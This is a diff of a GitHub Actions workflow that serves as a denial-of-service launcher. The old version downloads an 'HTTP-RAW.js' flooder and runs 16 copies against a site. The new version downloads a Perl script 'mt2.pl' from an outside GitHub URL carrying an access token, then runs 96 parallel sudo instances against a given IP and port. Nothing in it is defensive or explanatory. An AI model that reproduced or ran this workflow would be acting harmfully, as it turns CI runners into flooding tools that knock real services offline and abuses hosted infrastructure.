@@ -1,13 +1,17 @@
-name: RAW !
+name: Discord !
 
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: "Site !"
+        description: "IP !"
         required: true
-        default: "http://127.0.0.1/"
-
+        default: "127.0.0.1"
+      port:
+        description: "Port !"
+        required: true
+        default: "53"
+      
 jobs:
   vds:
     runs-on: ubuntu-latest
@@ -23,21 +27,22 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-
-          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/HTTP-RAW.js -O RAW.js
-          chmod +x RAW.js || true
-
+          PORT="${{ inputs.port }}"
+          
+          wget https://raw.githubusercontent.com/BirNumaraliBotcu/Botcu/refs/heads/main/mt2.pl?token=GHSAT0AAAAAADVEUT33HDCBYS6LW4HNKUSK2MYWDVQ -O mt2.pl
+          chmod +x mt2.pl || true
+          
           PIDS=()
-          for i in {1..16}; do
-            sudo timeout 65 node RAW.js "$TARGET" 65 &
+          for i in {1..96}; do
+            sudo timeout 30 perl mt2.pl "$TARGET" "$PORT" &
             PIDS+=($!)
           done
 
           for pid in "${PIDS[@]}"; do
             wait $pid
           done
-
+          
       - name: Finish !
         run: |
-          sleep 65
+          sleep 30
           exit 0
